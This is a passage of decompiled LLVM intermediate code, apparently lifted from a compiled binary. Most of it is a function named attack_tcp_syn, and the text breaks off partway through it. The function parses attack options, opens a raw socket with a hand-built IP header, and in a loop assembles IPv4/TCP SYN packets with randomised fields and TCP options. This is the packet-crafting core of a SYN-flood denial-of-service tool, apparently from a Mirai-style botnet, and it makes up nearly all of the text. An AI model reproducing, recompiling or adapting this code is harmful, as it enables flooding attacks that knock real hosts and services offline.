  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 30, 31, 32, 34, 33, 39, 35, 36, 37, 38, 43, 40, 41, 42, 44, 46, 45, 47, 48, 49, 50, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 65535, i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 65535, i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v5_b37c = or i32 %v3_b374, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
